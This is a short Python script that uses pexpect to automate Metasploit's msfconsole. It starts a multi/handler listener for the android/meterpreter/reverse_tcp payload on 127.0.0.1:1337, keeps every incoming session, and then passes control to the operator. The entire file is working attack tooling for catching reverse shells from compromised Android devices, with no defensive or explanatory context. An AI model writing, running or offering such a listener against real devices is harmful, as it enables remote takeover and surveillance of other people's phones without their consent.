import pexpect

LHOST = "127.0.0.1"
LPORT = "1337"
PAYLOAD = "android/meterpreter/reverse_tcp"

def launch_handler():
    child = pexpect.spawn("msfconsole", encoding='utf-8', timeout=30)
    child.expect("msf6 >")
    child.sendline("use exploit/multi/handler")
    child.expect("msf6 exploit")
    child.sendline(f"set payload {PAYLOAD}")
    child.sendline(f"set LHOST {LHOST}")
    child.sendline(f"set LPORT {LPORT}")
    child.sendline("set ExitOnSession false")
    child.sendline("exploit -j")
    child.interact()

if __name__ == "__main__":
    launch_handler()
